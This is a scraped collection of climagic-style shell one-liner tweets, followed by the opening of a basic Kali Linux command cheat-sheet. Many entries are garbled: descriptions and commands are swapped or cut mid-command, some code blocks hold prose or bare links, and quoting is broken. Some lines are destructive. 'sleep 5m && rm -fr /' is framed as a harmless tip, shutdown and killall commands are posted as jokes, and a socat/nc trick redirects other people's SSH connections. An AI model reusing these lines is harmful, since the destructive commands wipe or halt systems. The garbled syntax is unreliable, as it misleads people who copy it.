- Here, play some robotfindskitten, that will make things all better and you won't have to think about parsing HTML

```Bash
 robotfindskitten
```

- Print only the data between open and close pre tags in an HTML doc

```Bash
 sed -n -e '/<pre >/,/<\\/pre >/p' < data.html
```

- Fast extract audio track from a set of videos

```Bash
 for vid in *.avi ; do mplayer -ao "pcm:file=${vid%%.avi}.wav:fast" -vo null "$vid" ; done
```

- Use readline shortcuts in GUI (eg. Ctrl-U)

```Bash
 printf \'include "/usr/share/themes/Emacs/gtk-2.0-key/gtkrc"\\ngtk-key-theme-name = "Emacs"\\n\'
```

- Find .htaccess files with "allow from" directives (that may need revision)

```Bash
 find www -name .htaccess -exec grep -l "Allow from" {} +
```

- How Wargames would have ended if they had been using two factor auth

```Bash
 https://t.co/KBT3N3pUOp
```

- Player chooses c h m o d as his letters. It didn't give him the access he needed. Not in the wheel group I guess

```Bash
 http://t.co/pt7B5B7QKf
```

- This will show a count of all lines that have more than 1 copy. So only show the duplicates. (-d)

```Bash
 uniq -cd
```

- Show a 3 month view (before, current, after) in cal

```Bash
 cal -3
```

- Find which Debian package the notify-send program is included with - > libnotify-bin

```Bash
 dpkg -S $( which notify-send )
```

- Pass the output of which (showing path to lspci) into rpm's -qf, which tells you the pkg

```Bash
 rpm -qf $( which lspci )
```

- /\\xE2\\x96\\x88/g' < qr-code

```Bash
 sed -e 's/
```

- You're SSH'd to your home box and you want to port forward to your router's web admin via localhost:8080

```Bash
 [Enter]~C -L 8080:192.168.1.1:80
```

- Use sox to invert track and get hidden audio signal

```Bash
 sox -m -v1 24.flac -v-1 24_CTF.flac signal.wav silence 2 5 2%
```

- For your Friday amusement. Thx @komidore64

```Bash
 http://t.co/P4wxRLZYF7
```

- A rainbow in your shell

```Bash
 yes "$(seq 231 -1 16)" | while read i; do printf "\\x1b[48;5;${i}m\\n"; sleep .02; done
```

- CircleCityCon in Indy. Wearing the climagic logo t-shirt so if you see me, say hi. climagic meetup near registration area at 7:10pm

```Bash
 I'm at
```

- Unless you have this option turned off for your filesystem, this will show you the last accessed time of files

```Bash
 ls -l --time=atime
```

- vim tip: pressing '.' in command mode will repeat the last change made (insert, append, delete, etc.). Can be prefixed with number

```Bash
 .
```

- Clear the contents of logfile, reducing it to 0 bytes. Often used when you don't want to change the perms/mode of the file

```Bash
  >logfile
```

- Pass two runs of ifconfig 60 seconds apart through the same grep using a subshell

```Bash
 ( ifconfig eth0 ; sleep 60 ; ifconfig eth0 ) | grep X
```

- Find specific lines matching session opened and print the 3rd word from end

```Bash
 awk '/session opened/ {print $(NF-2)}' /var/log/auth.log
```

- theinternetofthings

```Bash
 Dude, you ssh\'d into someone\'s mouth?
```

- Remote intercom system. "Kent, this is God!"

```Bash
 rec -t wav - | ssh remotehost play -t wav -
```

- Show the path to the executable that was run to start PID 2394. Need permission

```Bash
 lsof -p 2394 |awk \'{if ($4=="txt"){print $NF}}\' |head -1
```

- mod

```Bash
 find . -name \'*.html\' |while IFS=\\n read f ; do r=$(mktemp);touch -r "$f" $r;t=$(stat -c %y "$f");mod "$f";touch -r $r "$f";rm $r;done
```

- Use regex boundary markers (\\b) to find instances of the string ed alone in a file

```Bash
 grep -E "\\bed\\b" queue.txt
```

- Mmmmm, donuts. Today is national donut day. Requires rss-glx package

```Bash
 /usr/lib/xscreensaver/lattice --tasty
```

- Take a single 1280x720 picture of your TV input, which is often your webcam

```Bash
 mplayer -vo png -frames 1 tv:// -tv width=1280:height=720
```

- Order filesystems by percent usage and keep header in place

```Bash
 df -hP |column -t |tee  >( head -n1 > /dev/stderr ) |grep % |sort -k5nr
```

- Show perms/owner at each dir level

```Bash
 treeperms(){ d=$(cd "$1" ; pwd -P) ; ls -ld "$d"; [[ "$d" != "/" ]] && treeperms $(dirname "$d"); }
```

- Don't watch the clock yourself, Auto check when a tunnel interface times out

```Bash
 while ifconfig utun0 > /dev/null; do sleep 15; done; date
```

- Because you ain't got time to use find -type f -exec blah. Just redirect the errors to devnull

```Bash
 grep -li color /etc/* 2 > /dev/null
```

- Make box around text. http://t.co/ptTP0mmlCx

```Bash
 function box(){ t="$1xxxx";c=${2:-=}; echo ${t//?/$c}; echo "$c $1 $c"; echo ${t//?/$c}; }
```

- Display top bandwidth hogs on website

```Bash
 awk \'{a[$1] += $10} END {for (h in a) print h " " a[h]}\' access_log | sort -k 2 -nr | head -10
```

- Filter by port range to host and connection state. Thx @hecky and @raganello

```Bash
 lsof -iTCP@irc.evil.net:1024-50000 -s TCP:ESTABLISHED
```

- Show what processes are using port 80 either locally or remotely. Need to be root for unowned processes

```Bash
 lsof -i TCP:80
```

- Learn vim while playing an adventure game

```Bash
 http://t.co/wGMlnbfTcx
```

- Mouse spiral

```Bash
 x=0;y=0;while [[ $y -lt 500 ]] ; do xdotool mousemove --polar $x $y ; x=$(($x+3));y=$(($y+1)); sleep 0.001; done
```

- Tron lightcycles in the terminal or Etch-a-sketch. Take your pick

```Bash
 http://t.co/zZmcvsVtwi
```

- Another one to try

```Bash
 /usr/lib/xscreensaver/apple2 -text -fast -program $SHELL
```

- Use phosphor for your terminal

```Bash
 /usr/lib/xscreensaver/phosphor -scale 2 -delay 5000 -geometry 1024x768 -program $SHELL
```

- climagic, meet the magic keyboard

```Bash
 http://t.co/SprJ1PiMMl
```

- The origin of the sudo command as told by its co-author Bob Coggeshall. Thx normod

```Bash
 https://t.co/DNcP31ykga
```

- Foremost is a file recovery program that can extract files from disk images and more. http://t.co/JP4nL6iSyN

```Bash
 foremost
```

- Play all the media files in the current directory by mod time for file

```Bash
 ls -tr > timeordered ; mplayer -playlist timeordered
```

- saves you searching for disks and other block devs attached to your

```Bash
 lsblk
```

- The real meaning of

```Bash
 for i in {A..Z}; do echo $i; done |nl |grep "[XKCD]" |awk \'{sum+=$1} END {print sum}\'
```

- \xcf\x80 * l33t% = 42 Happy

```Bash
 echo "scale=10; 3.1415926535 * (1337.0/100.0)" | bc
```

- Print the decimal encoded value of an * (everything)

```Bash
 printf \'%d\\n\' "\'*
```

- Lego keyboard. Now you have a new project

```Bash
 https://t.co/HRbyGyotGx
```

- After receiving this command about 100x from followers over the years, I can finally safely post it. Thx @NuxRo

```Bash
 http://t.co/n3Lqug0E1k
```

- Your own mv function for files with a "template"

```Bash
 my_mv(){ d_id=$( basename "$(pwd)" |cut -d\' \' -f2); mv -v "$1" "special_${d_id}-$2_$1; }
```

- Untar a program file and cd into the directory it created without the .tar.gz extension

```Bash
 tar xvf program-1.2.3.tar.gz ; cd ${_%%.tar.gz}
```

- :$:s/.png/.jpg/

```Bash
 convert -quality 80 Screenshot-2014-05-20.png !
```

- :1"{}

```Bash
 curl http://example\\.com/vids/ | grep -Po \'(?<=")[^"]+.webm(?=")\' | xargs -I{} -n1 wget !
```

- This document explains the differences between !$, Meta+. and $_ for referencing "last args"

```Bash
 http://t.co/d1wFX5sHQr
```

- $_ is a shell special variable that expands to the last argument given in the prev command. Thx @PetrHodac

```Bash
 mkdir -p /tmp/a/b/c ; cd $_
```

- You may have heard about Docker and Linux containers. Here is a good primer on LJ. Thx @brimston3

```Bash
 http://t.co/Zn4bsvNGAD
```

- How to setup THX startup sound, cd+video and Ackbar Ctrl-C for yourself

```Bash
 http://t.co/QtnrBFR67K
```

- Correction, but I wasn't really serious

```Bash
 cd(){ builtin cd $@; mplayer -quiet -geometry 400x280+0+0 "$(ls -1 ~/Videos/*|shuf| head -1)" & }
```

- Make your shell more like a website

```Bash
 cd(){ builtin cd $@; mplayer -quiet -geometry 400x280+0+0 "$(ls -1 ~/Videos/|shuf| head -1)" &); }
```

- For the non-believers. TIMTOWTDI!

```Bash
 grep "Yes it" $( which frozen-bubble ) && wc -l $_
```

- Convert to mp3. One of the reasons @erikaheidi & @laceytech <3 Linux

```Bash
 for f in *.wav; do lame --vbr-new -V 3 "$f" "${f%.wav}.mp3"; done
```

- Disable the Back/Forward keys (at least on my keyboard). Great for babies

```Bash
 xmodmap -e "keycode 166 = 0x0000" -e "keycode 167 = 0x0000
```

- SVG 2 PNG in CWD

```Bash
 find . -maxdepth 1 -name \'*.svg\' |while IFS=$\'\\n\' read f ; do inkscape "$f" --export-png="PNG/${f%%.svg}.png"; done
```

- THXsh startup sound

```Bash
 echo '(play -q -n synth sine F2 sine C3 remix - fade 0 4 .1 norm -4 bend 0.5,2399,2 fade 0 4.0 0.5 &)' > > ~/.bashrc
```

- Idea: Backslashing the * glob instead of quoting the expression. Thx @lorddrachenblut

```Bash
 find ./music  -name \\*.mp3 -exec cp {} ./new \\;
```

- Easy peasy time warp tweety @DrFNFurter

```Bash
 at "now + 5 years"  < \'t update "...pation"\'
```

- tarbombparty

```Bash
 @discreetsecure Heh, then address everyone you know in the Cc line and watch them start repling to all.
```

- If you want to learn about tar, watch this video I made 4 years ago

```Bash
 http://t.co/ZUP6jYwnu4
```

- Detect

```Bash
 tarbomb(){ [[ $( tar tf "$1" |sed \'s,^\\./,,\' |awk -F/ \'{print $1}\' |sort |uniq |wc -l ) -eq 1 ]] && echo "OK" || echo \'Tarbomb!\'; }
```

- Its not Friday yet?

```Bash
 while [[ $( date +%A ) != "Friday" ]]; do echo Its not Friday yet ; sleep 1h ; done ; echo "Yea Friday
```

- Send every two files found through diff. (Of course, this may not always be what you want) For @mgpreppy

```Bash
 find -print0 | xargs -0 -n 2 diff
```

- Move all files modified in the last 2 mins to ./target .Thx @davidnormo

```Bash
 find ~/path/to/files -mmin -2 -execdir mv -t ./target/ {} +
```

- MIND BLOWN! \xcf\x80 * l33t% = 42 Thx @Notfound404__

```Bash
 echo "scale=10; 3.1415926535 * (1337.0/100.0)" | bc
```

- epoch //via @climagic

```Bash
 RT @blubtwit: Happy 1400000000
```

- See what is in the file called '-'. 9 times out of 10 for me this is the output of strace or tcpdump

```Bash
 less ./-
```

- Show the differences between two directories. comm can also be good for this

```Bash
 diff <(cd dir1 ; ls -1 | sort) <(cd dir2 ; ls -1 | sort)
```

- AA countdown to 1.4 billion epoch

```Bash
 e=1400000000;while [[ $(date +%Y) -ne $e ]];do figlet $(($e-$(date +%s)));sleep 1;clear;done;figlet $e
```

- See what local time for you the

```Bash
 e=1400000000;date -d @$e || date -r $e
```

- Start a web service on port 8000. Among other things, it can be useful to testing LISTENing ports vs firewall

```Bash
 python -m SimpleHTTPServer
```

- See the last logged in users, but filter out entries for root, reboots and asmith

```Bash
 last -da | egrep -v "^(root|reboot|asmith)
```

- How scientist and climagic follower @MikeRSpencer is using the command line to help track snowfall in Scotland

```Bash
 http://t.co/SnUORpJ3tv
```

- Lots of amusing anecdotes of command line mistakes here. Especially in the comments

```Bash
 http://t.co/k8sSDdktZp
```

- opps

```Bash
 Man takes picture of himself every day for 10 years, then carelessly runs dd if=/dev/sdb of=/dev/sda to copy his 1st drive to 2nd.
```

- 4fun

```Bash
 grep -o --binary-files=text '[[:alpha:]]' /dev/urandom |tr -d '[a-zA-Z]' |xargs -n $(($COLUMNS/2)) |tr -d ' '| lolcat -f | pv -L80k
```

- OH THE HORROR!!

```Bash
 List thread: "Subject: Troubleshooting Linux Applications Without Using the Command Line
```

- |^\\ *$)" httpd.conf | less

```Bash
 egrep -v "(^
```

- Alias for mplayer when you want its window matched with special rule for devilspie or other

```Bash
 alias mplayerdp=\'mplayer -title "mplayer dp"\'
```

- Use the -d option when you want to see the directory itself instead of what's inside when you use wildcards like this

```Bash
 ls -ld *log*
```

- Send a signal to any/all dd processes to give a status report every five minutes

```Bash
 while :; do killall -USR1 dd ; sleep 5m ; done
```

- Moves the first line of the file to the end, allowing to cycle through it. Thx @benthorben

```Bash
 sed -ni '1h;1!p;${x;p}' queuefile
```

- 1: What's in this chest? Kid

```Bash
 Kid
```

- Using a logical && after sleep gives you a chance to Ctrl-C out of sleep without it running the rest

```Bash
 sleep 5m && rm -fr /
```

- Sleep for 5 days, 2 hours, 1 minute and 15 seconds. This syntax works in GNU coreutils sleep at least

```Bash
 sleep 5d 2h 1m 15s
```

- full process output in a tree view so you can see the parent - > child process relationships

```Bash
 ps auxwf
```

- scrot is a nice command for capturing screenshots of the whole screen, a window or a selected area

```Bash
 scrot -s screenshotname.png
```

- Check if file is done downloading from Firefox (not 0 bytes) before moving

```Bash
 [ -s ./Downloaded.zip ] && mv -v Downloaded.zip Ringtones.zip
```

- Cures most shell symptoms, including runny prompts, echo congestion, binary infection and color stain. Use only as directed

```Bash
 reset
```

- Use -r to download a byte range from large file

```Bash
 curl -r 61049103-61865118 hackerpublicradio\\.org/eps/hpr1418.mp3 | mpg123 -
```

- Watch in real time as people mention your city on Twitter

```Bash
 t stream search -l "yourcityname state
```

- More secure than telnetmallows, but not as hip as moshmellows. Thx @hubert3 & @JCaesar

```Bash
 http://t.co/zBgf4cP274
```

- The speedometer program (http://t.co/noIyJQBBe6) makes a nice real time network graph

```Bash
 speedometer -k 256 -i 0.2 -r eth0 -t eth0
```

- Use multiple search terms, grep's count result and sort to find a doc by "scoring"

```Bash
 grep -Irc -e php -e mysql *.pkgs |sort -t: -k2nr|head
```

- Start playing music files with the 51st file in (0 indexed). Good for when wildcards would be too complex

```Bash
 f=(*.mp3); mpg123 ${f[@]:50}
```

- tbt http://t.co/IrmPouiDxs

```Bash
 Its a UNIX system, I know this.
```

- I find brace expansion very useful for renaming files. Expands to "mv Picture.jpg Picture-of-my-cat.jpg"

```Bash
 mv Picture{,-of-my-cat}.jpg
```

- f4f3f0 -opaque \\

```Bash
 convert detroit-green-shape.png -fuzz 3% -fill \\
```

- Side by side comparison of zip index

```Bash
 pr -W $COLUMNS -m -t <(unzip -l backup1.zip | sort -k4 ) <(unzip -l backup2.zip | sort -k4 ) | less
```

- Display changelog of 1st arg (pkg). If 2nd arg set, search for it in the log

```Bash
 changelog(){ rpm -q --changelog $1 |less -j3 ${2:++/"$2"}; }
```

- Start searching for text data, but skip the first 25GB (25k of 1MB blocks) of the drive

```Bash
 sudo dd if=/dev/sdc bs=1M skip=25k | strings -n12
```

- Search a drive for text data, but use a longer minimum size (default 4) to get a better signal to noise ratio

```Bash
 sudo strings -n12 /dev/sdc
```

- Sum up the bandwidth consumed by requests for matched lines. BTW, it was 35GB

```Bash
 awk '/itdance.gif/{sum+=$10} END { print sum }' access_log
```

- Give your photo a 70s look

```Bash
 convert +level-colors Firebrick, me.jpg oldme.jpg
```

- This will run ls without using any alias called ls that might be in place. You can do this with any command

```Bash
 \\ls
```

- Use rev twice to get around limitation of cut not being able to truncate end of a string

```Bash
 echo test | rev | cut -c 2- | rev
```

- Wkly Box Of. change

```Bash
 elinks imdb\\.to/1fzw0R4 |sed -n -e 's/[$,]//g' -e '/Gross/,/Weekend/p'|grep '(USA)'|tac|awk '{print $1-last; last=$1}'
```

- Determine what lines the file names2 has that are unique. The comm program requires sorted files

```Bash
 comm -13 <(sort names1) <(sort names2)
```

- You can put DATETIME in your shell rc file & use it to make time format

```Bash
 DATETIME="%Y%m%d_%H%M%S"; ps auxwwf > $(date +psauxwwf-$DATETIME)
```

- In pulseaudio, set the application volume of input sink

```Bash
 pactl set-sink-input-volume 353 60%
```

- Get PA sink id

```Bash
 pactl list| awk \'/(^Sink|process.id = "\'$(pidof pianobar)\'")/{if($0 ~ /^Sink/){s=$3};if($0~/process.id/){print s;exit};}\'
```

- Use less as your pager and open the man page perlre and find first instance of "Look-Around"

```Bash
 LESS="-p Look-Around" man -P less perlre
```

- Almost 2^16

```Bash
 f=$(curl -Ls twitter\\.com/climagic | grep -Po \'(?<=followers_count&quot;:)[0-9]+\') ;bc  < "ibase=10;obase=2;$f
```

- earthday

```Bash
 The command line gives you more computing power for less energy.
```

- This alone should save several megawatt hours today

```Bash
 killall firefox; killall chrome
```

- earthday

```Bash
 If each of my 65,000 followers shut off one computer for today it would save over 100 Megawatts.
```

- How many of you will actually do it instead of just retweeting it?

```Bash
 shutdown -h 0 || shutdown now || halt
```

- earthday  How many of you will actually do it?

```Bash
 shutdown -h 0 || shutdown now || halt
```

- with GNU sort doing a version sort would have the same effect

```Bash
 RT @iiSeymour: @climagic sort -V ipv4addrs.txt
```

- Sort IPv4 addresses numerically according to each class

```Bash
 sort -t . -n -k1,1 -k2,2 -k3,3 -k4,4 ipv4addrs.txt
```

- See all the programs in path dirs with suid or sgid bits set

```Bash
 find ${PATH//:/ } -type f -maxdepth 1 -perm /6000 -ls
```

- pzl

```Bash
 32596b4a6e657464 4849676748626751 6e6267455861325a 69596b4253633442 53626c4248497968 435a734133596b4a 4749693548497468 4749675541633d6f
```

- Move all duplicate files in CWD (except first in set) into 'dupes' sub-directory

```Bash
 fdupes -f . | xargs --delimiter='\\n' mv -vt dupes/
```

- heartbleed http://t.co/zqazzAEbSu

```Bash
 This one cracked me up. Thx @LizQuilty
```

- Check which hosts in IP list are not up

```Bash
 for i in $( cat ip-list ); do ping -c1 $i 2 >&1 > /dev/null || echo $i not up; done
```

- Get Google results number

```Bash
 gresults(){ s="$@"; wget -q -O- -U Mozilla www.google\\.com/search?q=\\"$s\\" |egrep -o "About [0-9,]+ results";}
```

- kill -9, the song. Warning: NSFW lyrics

```Bash
 http://t.co/Y1qS1EJ5HY
```

- Find all those crazy options you have to use to make an LDAP search, because you know you can't remember them. ;)

```Bash
 history |grep ldapsearch
```

- Or as @raganello just reminded me, you can just use the --last option. But that's too easy. ;-)

```Bash
 rpm -qa --last
```

- List rpms by date installed

```Bash
 rpm -qa --queryformat "%{INSTALLTIME} %{INSTALLTIME:date} %{NAME}\\n" |sort -n |cut -d\' \' -f2-
```

- Some interesting historical insight into sed's y command. Thx @gumnos

```Bash
 http://t.co/skoBjrQzVo
```

- Reduce the verbosity of mplayer output by turning down the msglevel of most modules

```Bash
 mplayer -msglevel all=-1:statusline=5:cplayer=5 *.mp3
```

- Or as @jacalvo_zentyal mentioned you can use time read or my favorite, time cat. Ctrl-D and read the "real time" in the output

```Bash
 time cat
```

- Quick and dirty stopwatch with nanosecond accuracy. [Enter] stops it

```Bash
 echo $(a=$(date +%s.%N); line; b=$(date +%s.%N); echo "$b-$a"|bc )
```

- Show a list of mail users and their login failed attempt count

```Bash
 grep "LOGIN FAILED" maillog | egrep -o "user=[^,]+," | sort | uniq -c
```

- I know it may be annoying at first, but it will save you hours later

```Bash
 cd(){ builtin cd $@; /etc/init.d/sssd restart; }
```

- Generate 16 x 4 random long-word passphrases from a list of common words

```Bash
 shuf common-words-10k.txt |egrep ".{5,}" |head -64 |xargs -n4
```

- As kinda a one off thing. If you find yourself doing a lot of line trimming, try this for one keystroke line delete

```Bash
 :map <F2 > dd
```

- Whenever I have to reboot this scene plays in my head except with "reboot"

```Bash
 https://t.co/0zXahrEZiy
```

- It can be both @Brisawoman @rcalsaverini ;-)

```Bash
 elinks -dump http://thefuckingweather\\.com/?zipcode=Fargo | grep " IT\'S" | (espeak||cat)
```

- Some people really go out of their way to insult others. Thx @brimston3

```Bash
 for d in {0..255}; do dig +short -x 202\\.78.246.${d}; done
```

- Get a list of website hostnames you've visited

```Bash
 echo "select host from moz_hosts;" | sqlite3 places.sqlite > ~/history-hosts.txt
```

- If you cant find an error message in your language on Google, run your command "in English". Thx @MarcCornella

```Bash
 LANG=en apt-get upgrade
```

- On Debian, find any packages that manage files in /boot and list them uniquely

```Bash
 dpkg -S '/boot/*' | cut -d: -f1 | sort | uniq
```

- Check what services are still using old now removed libraries and need to be reloaded. Thx @nmcfarl

```Bash
 sudo lsof -n | grep ssl | grep DEL
```

- Create an HD color plasma image. Different each time. Uses ImageMagick

```Bash
 convert -size 1920x1080 plasma:fractal background.png
```

- An alias that prints out extended ASCII chars

```Bash
 alias extendedascii=\'for i in {C..F}{{0..9},{A..F}}; do printf "$i \\x$i\\n"; done ; echo\'
```

- A few people have asked about my urxvt settings, so I'll share my Xdefaults file

```Bash
 http://t.co/leYjmU8GFQ
```

- Spice up your excessive usage of [Ctrl-C]

```Bash
 trap "echo;ack-grep --bar | sed \'y/ge/ta/\'" SIGINT
```

- Confuse people SSHing to your host with a redirect back to theirs

```Bash
 socat -d -d TCP-L:22,reuseaddr,fork SYSTEM:"nc \\$SOCAT_PEERADDR 22
```

- Convert a string in quotes to its hexadecimal codes in ASCII

```Bash
 ascii -s "show me the hex codes" | awk \'{print $3}\'
```

- Automatically installs your public key to the remote host (this is included in the openssh package)

```Bash
 ssh-copy-id 'user@remotehost'
```

- In vim, depending on whether your terminal background is dark or light, setting this will help with color syntax

```Bash
 :set background=dark
```

- status=none allows you to suppress the ending status info if you don't want it

```Bash
 dd status=none if=/dev/zero of=bigfile bs=1k count=1M
```

- Quickly find out how much data space is left on the partition that the current directory you are in resides

```Bash
 df -h .
```

- Display an ASCII art cat. There, after 4 years I finally posted an ack command

```Bash
 ack-grep --thpppt
```

- New rot546 is super strong encryption

```Bash
 rot546(){ s=$@;for ((r=0;r<43;r++)){ s=$(tr A-Za-z N-ZA-Mn-za-m  < "$s"|base64);};echo "$s"; }
```

- Nobody will criticize your ideas again

```Bash
 echo "XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X" > > .signature
```

- Poor man's auto updating slideshow image

```Bash
 while true;do for i in ~/Pictures/*.jpg ;do cp "$i" ~/slideshow.jpg ;sleep 5;done; done
```

- See how many references to pi are made in the Linux version 3.14 patch

```Bash
 xzgrep -E -o "\\bpi\\b" patch-3.14.xz | wc -w
```

- See the BUGS part of the mutt man page. Thx mof18202  (check man man for 'col -b' trick)

```Bash
 man mutt | col -b | sed -n '/^BUGS/,+10p'
```

- Linux manpages. :3

```Bash
 RT @mof18202: "BUGS: More than you can imagine." I like honest
```

- Upgrade new

```Bash
 sed -i \'s/{% url \\([a-z_]*\\) /{% url "\\1" /\' $(find . -name "*.html")
```

- Spinning ASCII art globe

```Bash
 curl -s http://artscene.textfiles\\.com/vt100/globe.vt | pv -L9600 -q
```

- Divide files by the column count in each line. Thx @unfo

```Bash
 awk -F\';\' \'{ fname=sprintf("lines_with_%s_columns.txt", NF); print > > fname }\'
```

- If you encounter a file that is hard to type/tab complete, try using a ? to replace the characters you can't type

```Bash
 mplayer M?rklintage*
```

- The pee command can run head and tail on same input. sponge waits for all the data first

```Bash
 ping -c100 4.2.2.2 | sponge | pee head tail
```

- Exploding cow animation I found in old e-mail

```Bash
 curl -s www.climagic\\.org/ascii/explodingcow-animation-1995.gz |zcat |pv -L2400 -q
```

- Today's famous birthdays

```Bash
 elinks -no-numbering -dump-width $COLUMNS $(date +"http://t.co/8PCWfAtTFP")|sed \'/Births/,/Deaths/!d\'|grep \\*
```

- reptyr can be used to reattach a program on another tty to the current tty so you can transfer it into screen/tmux

```Bash
 reptyr <pid >
```

- Using -e multiple times for multiple expressions is possible and a bit more readable

```Bash
 grep -e string1 -e string2 -e regex1 file
```

- Someone made a clone of 2048 in only 278 lines of bash script. Sorry about your time. Thx @PBirkants

```Bash
 https://t.co/bgcwCShaCR
```

- pi_backup is a new command that simply returns an index number where your data is stored within pi. See also, pi_restore

```Bash
 pi_backup /
```

- Req. ImageMagick

```Bash
 convert -size 413x314 xc:tan -fill red -pointsize 200 -gravity center -draw "text 0,0 \'3.14\'" -flop pie.png
```

- EFF! Thx @Matteotom

```Bash
 dig -t NAPTR +short http://t.co/EXIR3mAPn9 | sort
```

- Show a count of the number of sent messages by day through your mail server

```Bash
 grep status=sent /var/log/maillog | cut -c1-7 | uniq -c
```

- isintime 8am 5pm && update Thx @brimston3

```Bash
 isintime(){ s=$(date +%s);[ $(date -d "$1" +%s) -lt $s ] && [ $s -lt  $(date -d "$2" +%s) ]; }
```

- Run update every 5min between 8am and 5pm

```Bash
 while true; h=$(date +%_H); [[ $h -ge 8 && $h -lt 17 ]] && update; sleep 5m; done
```

- Only run update every 5min between 8am and 5pm

```Bash
 while true; h=$(date +%_H); [ $h -ge 8 && $h -lt 17 ] && update; sleep 5m; done
```

- You can specify alternate rpm db paths if you want. You can even do this on non-rpm based systems

```Bash
 rpm --dbpath=~/backup-rpm-dir -qi httpd
```

- climagic

```Bash
 I still haven't figured out a way to notify you when Twitter is down from the shell yet. Maybe just 'weechat irc.freenode\\.org/
```

- % Pkt loss

```Bash
 elinks -no-numbering -no-references internetpulse\\.net/?Metric=PL |egrep --color=no -e \'Dest|Gener\' -e "NTT.*XO" -e " 0 .* 0
```

- PWD is ~/.config/xfce4/xfconf/xfce-perchannel-xml and I needed to copy from a xfce4-backup dir I made

```Bash
 cp -a ${PWD/xfce4/xfce4-backup}/* .
```

- A text mode file manager similar to mc, but isn't as cumbersome as mc IMHO. View, play, manage media files quickly. Thx @mtelesha

```Bash
 ranger
```

- See what the word inconceivable really means

```Bash
 dict inconceivable
```

- Check what databases are stored inside a simple compressed mysql dump file

```Bash
 zgrep "^CREATE DATABASE" dbbackups.mysql.gz
```

- thedownside it means I have to reboot my computers

```Bash
 Moving into a bigger cube is nice, but on
```

- You can use rev to reverse a word or sentence

```Bash
 rev  < "Naomi, sex at noon taxes I moan
```

- Find out if xfce4-terminal uses the libvte library or not. Check your own terminal program

```Bash
 ldd /usr/bin/xfce4-terminal | grep libvte
```

- Find out if the terminator terminal uses the libvte library or not. Check your own terminal program

```Bash
 ldd /usr/bin/terminator | grep libvte
```

- Print the line if it has a 6th column of text in it

```Bash
 awk '$6' scan.txt
```

- Move a directory while you're inside it. Only works if on same partition

```Bash
 mkdir sub1 sub2; cd sub1 ; mv ../sub1 ../sub2 ; cd . ; pwd
```

- Climagic video demonstrating gnome-terminal's scrollback being written to disk

```Bash
 http://t.co/wDRy0UO5G4
```

- Still a problem after 2 years. Don't use libvte based terms (gnome-terminal, Terminator, xfce4-term, etc.)

```Bash
 http://t.co/WWKCZU75fh
```

- Quickly find the largest 5 files in a directory tree on a single file system

```Bash
 find . -xdev -ls 2 > /dev/null | sort -k7nr | head -5
```

- Random color per log line

```Bash
 tail -F syslog |while read -r line;do printf "\\e[38;5;%dm%s\\e[0m\\n" $(($RANDOM%255)) "$line";done
```

- Stump your friends. How many months had only 19 days? Answer: 1 (The Month the United States switched to Gregorian)

```Bash
 cal 9 1752
```

- Sleep infinitely or until the next shutdown, whichever comes first

```Bash
 sleep infinity
```

- Yes this works and sleeps for 255 seconds. (doesn't work on all versions of sleep)

```Bash
 sleep 0xFF
```

- List the contents of each gz compressed file, including the compression ratio/uncompressed size. Doesn't work on stdin- >gzip

```Bash
 gzip -l *.gz
```

- Copy file to the previous directory you were in. See "tilde expansion" in bash man page. Thx @gumnos

```Bash
 cp file.txt ~-/
```

- Remove the previous word on the command line (before the cursor). This is highly useful when reusing old commands

```Bash
 <Ctrl-w >
```

- This is usually equivilent to running 'clear'.  Its usually quicker and doesn't leave the command in your command line history

```Bash
 <Ctrl-l >
```

- Manual lists this as Ctrl-_ but Ctrl-- usually works too. Incremental undo of command line edits

```Bash
 <Ctrl-- >
```

- Insert the last argument from the previous line in the command history into the current line. Different from !$

```Bash
 <Meta-. >
```

- Move your cursor to the end of the line. Faster than holding down right arrow

```Bash
 <Ctrl-e >
```

- Move your cursor to the beginning of the line. Faster than holding down left arrow. In screen, you need to press <Ctrl-a a >

```Bash
 <Ctrl-a >
```

- Reverse search through your command history for 'string'. Press Ctrl-r again to continue searching backwards. ESC when done

```Bash
 <Ctrl-r >string
```

- description. The

```Bash
 Just a reminder about the format of climagic tweets: command
```

- (With no arguments) Takes you back to your home directory

```Bash
 cd
```

- Takes you back to the previous directory you were in. Good to know if you don't already

```Bash
 cd -
```

- Date the system booted last. Uses Perl regex (zero-width look behind assertion)

```Bash
 date -d "now - $( uptime | grep -o -P "(?<=up )[^,]+" )
```

- Thx @gumnos

```Bash
 look .|awk \'/^[a-g]{3,}$/{print gensub("."," pl &3","g",toupper($0))}\'|while read w;do echo $w;play -n synth $w fade h 0 2;done
```

- Download a series of timed images from a site with 1 second delay between

```Bash
 wget -w1 http://www.example\\.com/{00..23}h{00,15,30,45}m.png
```

- Find 4+ letter words that are spelled using only musical note letters

```Bash
 look . | egrep "^[a-g]{4,}$
```

- Stack a lot of files Thx @amenthes_de

```Bash
 convert -size 1920x1080 `find . -iname "*test*" | sed "s/^/ -page +0+0 /"` -layers flatten stack.png
```

- Find a file with a newline or carriage return characters in its name. Req by @peelman

```Bash
 find . -name '*['$'\\r'$'\\n'']*'
```

- Swap integer values without intermediary variable using XOR Equals (As long as they aren't too big). Thx @spikygeek

```Bash
 ((A^=B,B^=A,A^=B))
```

# Kali Linux Commands

- Set the Target IP Address to the `$ip` system variable

```Shell
export ip=192.168.1.100
```

- Find the location of a file

```Shell
locate sbd.exe
```

- Search through directories in the `$PATH` environment variable

```Shell
which sbd
```

- Find a search for a file that contains a specific string in its name:

```Shell
find / -name sbd\*
```

- Show active internet connections

```Shell
netstat -lntp
```

- Change Password

```Shell
passwd
```

- Verify a service is running and listening

```Shell
netstat -antp |grep apache
```

- Start a service

```Shell
systemctl start ssh
```

```Shell
systemctl start apache2
```

- Have a service start at boot

```Shell
systemctl enable ssh
```

- Stop a service

```Shell
systemctl stop ssh
```

- Unzip a gz file

```Shell
gunzip access.log.gz
```

- Unzip a tar.gz file

```Shell
tar -xzvf file.tar.gz
```

- Search command history

```Shell
history | grep phrase_to_search_for
```

- Download a webpage

```Shell
wget http://www.cisco.com
```

- Open a webpage

```Shell
curl http://www.cisco.com
```

- Print all files content in a directory

```Shell
find . -print0 | while read -d $'\0' file; do cat $file; done
```

## String manipulation

- Count number of lines in file

```Shell
wc -l index.html
```

- Get the start or end of a file

```Shell
head index.html
```

```Shell
tail index.html
```

- Extract all the lines that contain a string

```Shell
grep "href=" index.html
```

- Pick all strings from a binary file

```Shell
strings <file_name> | grep <searched text>
```

- Count unique lines in file

```Shell
sort ips.txt | uniq -c | sort -bgr
```

- Concatenate lines

```Shell
cat <file name> | paste -sd "" -

